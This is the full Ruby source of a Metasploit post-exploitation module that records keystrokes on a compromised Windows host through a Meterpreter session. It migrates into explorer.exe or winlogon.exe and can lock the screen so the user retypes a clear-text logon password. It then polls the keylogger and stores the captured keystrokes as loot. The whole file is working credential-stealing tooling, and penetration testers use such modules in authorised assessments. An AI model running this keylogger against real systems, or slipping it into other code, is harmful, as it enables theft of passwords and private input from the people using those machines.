##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Priv
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
        'Name'           => 'Windows Capture Keystroke Recorder',
        'Description'    => %q{
          This module can be used to capture keystrokes. To capture keystrokes when the session is running
          as SYSTEM, the MIGRATE option must be enabled and the CAPTURE_TYPE option should be set to one of
          Explorer, Winlogon, or a specific PID. To capture the keystrokes of the interactive user, the
          Explorer option should be used with MIGRATE enabled. Keep in mind that this will demote this session
          to the user's privileges, so it makes sense to create a separate session for this task. The Winlogon
          option will capture the username and password entered into the logon and unlock dialog. The LOCKSCREEN
          option can be combined with the Winlogon CAPTURE_TYPE to for the user to enter their clear-text
          password.
            },
        'License'        => MSF_LICENSE,
        'Author'         => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>',
                              'Josh Hale <jhale85446[at]gmail.com>'],
        'Platform'       => [ 'win' ],
        'SessionTypes'   => [ 'meterpreter', ]

      ))
    register_options(
      [
        OptBool.new('LOCKSCREEN',   [false, 'Lock system screen.', false]),
        OptBool.new('MIGRATE',      [false, 'Perform Migration.', false]),
        OptInt.new( 'INTERVAL',     [false, 'Time interval to save keystrokes in seconds', 5]),
        OptInt.new( 'PID',          [false, 'Process ID to migrate to', nil]),
        OptEnum.new('CAPTURE_TYPE', [false, 'Capture keystrokes for Explorer, Winlogon or PID',
                'explorer', ['explorer','winlogon','pid']])

      ], self.class)
    register_advanced_options(
      [
        OptBool.new('ShowKeystrokes',   [false, 'Show captured keystrokes', false]),
        OptInt.new( 'KeylogTimeOut',     [true, 'Time to close keylog recorder on stale session in seconds (150 to 900)', 300])
      ], self.class)
  end


  def run
    print_status("Executing module against #{sysinfo['Computer']}")
    if datastore['MIGRATE']
      if datastore['CAPTURE_TYPE'] == "pid"
        if  !migrate_pid(datastore['PID'], session.sys.process.getpid)
          print_error("Unable to migrate to given PID. Using Explorer instead.")
          process_migrate
        end
      else
        return unless process_migrate
      end
    end

    if startkeylogger
      @logfile = set_log
      keycap
    end
  end

  # Initial Setup values
  #
  # @return [void] A useful return value is not expected here
  def setup
    @logfile = nil
    @timed_out = false

    @interval = datastore['INTERVAL'].to_i
    if @interval < 1
      print_error("INTERVAL value out of bounds. Setting to 5.")
      @interval = 5
    end

    @timeout = datastore['KeylogTimeOut'].to_i
    if @timeout < 150 || @timeout > 900
      print_error("KeylogTimeOut value out of bounds. Setting to 300.")
      @timeout = 300
    end
  end

  # This function sets the log file and loot entry.
  #
  # @return [StringClass] Returns the path name to the stored loot filename
  def set_log
    store_loot("host.windows.keystrokes", "text/plain", session, "Keystroke log on #{sysinfo['Computer']} with user #{client.sys.config.getuid} started at #{Time.now.to_s}\n\n", "keystrokes.txt", "User Keystrokes")
  end

  # This locks the Windows screen if so requested in the datastore.
  #
  # @return [void] A useful return value is not expected here
  def lock_screen
    print_status("Locking the desktop...")
    lock_info = session.railgun.user32.LockWorkStation()
    if lock_info["GetLastError"] == 0
      print_status("Screen has been locked")
    else
      print_error("Screen lock failed")
    end
  end

  # This function evaluates the capture type and migrates accordingly.
  # In the event of errors, it will default to the explorer capture type.
  #
  # @return [TrueClass] if it successfully migrated
  # @return [FalseClass] if it failed to migrate
  def process_migrate
    captype = datastore['CAPTURE_TYPE']

    if captype == "winlogon"
      if is_uac_enabled? and not is_admin?
        print_error("UAC is enabled on this host! Winlogon migration will be blocked. Using Explorer instead.")
      else
        success = migrate(get_pid("winlogon.exe"), "winlogon.exe", session.sys.process.getpid)
        lock_screen if datastore['LOCKSCREEN'] && success
        return success
      end
    end

    return migrate(get_pid("explorer.exe"), "explorer.exe", session.sys.process.getpid)
  end

  # This function returns the first process id of a process with the name provided.
  # It will make sure that the process has a visible user meaning that the session has rights to that process.
  # Note: "target_pid = session.sys.process[proc_name]" will not work when "include Msf::Post::Windows::Priv" is in the module.
  #
  # @return [Fixnum] the PID if one is found
  # @return [NilClass] if no PID was found
  def get_pid(proc_name)
    processes = client.sys.process.get_processes
    processes.each do |proc|
      if proc['name'] == proc_name && proc['user'] != ""
        return proc['pid']
      end
    end
    return nil
  end

  # This function attempts to migrate to the specified process by Name.
  #
  # @return [TrueClass] if it successfully migrated
  # @return [FalseClass] if it failed to migrate
  def migrate(target_pid, proc_name, current_pid)
    if !target_pid
      print_error("Could not migrate to #{proc_name}.")
      return false
    end

    print_status("Trying #{proc_name} (#{target_pid})")

    if target_pid == current_pid
      print_good("Already in #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
      return true
    end

    begin
      client.core.migrate(target_pid)
      print_good("Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
      return true
    rescue ::Rex::Post::Meterpreter::RequestError => error
      print_error("Could not migrate to #{proc_name}.")
      print_error(error.to_s)
      return false
    end
  end

  # This function attempts to migrate to the specified process by PID only.
  #
  # @return [TrueClass] if it successfully migrated
  # @return [FalseClass] if it failed to migrate
  def migrate_pid(target_pid, current_pid)
    if !target_pid
      print_error("Could not migrate to PID #{target_pid}.")
      return false
    end

    if !has_pid?(target_pid)
      print_error("Could not migrate to PID #{target_pid}. Does not exist!")
      return false
    end

    print_status("Trying PID: #{target_pid}")

    if target_pid == current_pid
      print_good("Already in #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
      return true
    end

    begin
      client.core.migrate(target_pid)
      print_good("Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
      return true
    rescue ::Rex::Post::Meterpreter::RequestError => error
      print_error("Could not migrate to PID #{target_pid}.")
      print_error(error.to_s)
      return false
    end
  end

  # This function starts the keylogger
  #
  # @return [TrueClass] keylogger started successfully
  # @return [FalseClass] keylogger failed to start
  def startkeylogger
    begin
      print_status("Starting the keylog recorder...")
      session.ui.keyscan_start
      return true
    rescue
      print_error("Failed to start the keylog recorder: #{$!}")
      return false
    end
  end

  # This function dumps the keyscan and uses the API function to parse
  # the extracted keystrokes.
  #
  # @return [void] A useful return value is not expected here
  def write_keylog_data
    output = session.ui.keyscan_extract(session.ui.keyscan_dump)

    if not output.empty?
      print_good("Keystrokes captured #{output}") if datastore['ShowKeystrokes']
      file_local_write(@logfile,"#{output}\n")
    end
  end

  # This function manages the key recording process
  # It stops the process if the session is killed or goes stale
  #
  # @return [void] A useful return value is not expected here
  def keycap
    rec = 1

    print_status("Keystrokes being saved in to #{@logfile}")

    print_status("Recording keystrokes...")

    while rec == 1
      begin
        if session_good?
          sleep(@interval)
          write_keylog_data
        else
          print_status("Session: #{datastore['SESSION']} is stale or has been closed. Exiting keylog recorder.")
          rec = 0
        end
      rescue::Exception => e
        if e.class.to_s == "Rex::TimeoutError"
          print_status("Session: #{datastore['SESSION']} is not responding. Exiting keylog recorder.")
          @timed_out = true
        elsif e.class.to_s == "Interrupt"
          print_status("User interrupt. Exiting keylog recorder.")
          rec = 0
          return
        else
          print_error("Keylog recorder encounted Error: #{e.class} #{e} Exiting...")
        end
        rec = 0
      end
    end
  end

  # This function makes sure a session is still alive acording to the Framework.
  # Also, if the session reaches the timeout age whithout checking in it is
  # assumed to be stale.
  #
  # @return [TrueClass] Session is still alive (Framework) and not stale
  # @return [FalseClass] Session is dead or deamed stale
  def session_good?
    return false unless session.alive?
    session_age = Time.now.to_i - session.last_checkin.to_i
    return false if session_age >= @timeout
    return false if @timed_out
    return true
  end

  # This function writes off the last set of key strokes
  # and shuts down the key logger
  #
  # @return [void] A useful return value is not expected here
  def finish_up
    print_status("Shutting down the keylog recorder. Stand by.")
    sleep(@interval)
    begin
      write_keylog_data
    rescue::Exception => e
      if e.class.to_s == "Rex::TimeoutError"
        print_status("Session: #{datastore['SESSION']} is not responding. Exiting keylog recorder.")
      else
        print_error("Keylog recorder encounted Error: #{e.class} #{e} Exiting...")
      end
      return
    end
    session.ui.keyscan_stop rescue nil
  end

  # This function cleans up the module.
  # finish_up was added for clean exit when this module is run
  # as a job.
  #
  # Known Issue: This appears to run twice when killing the job. Not sure why.
  # Does not cause issues with output or errors.
  #
  # @return [void] A useful return value is not expected here
  def cleanup
     finish_up if session_good?
  end
end
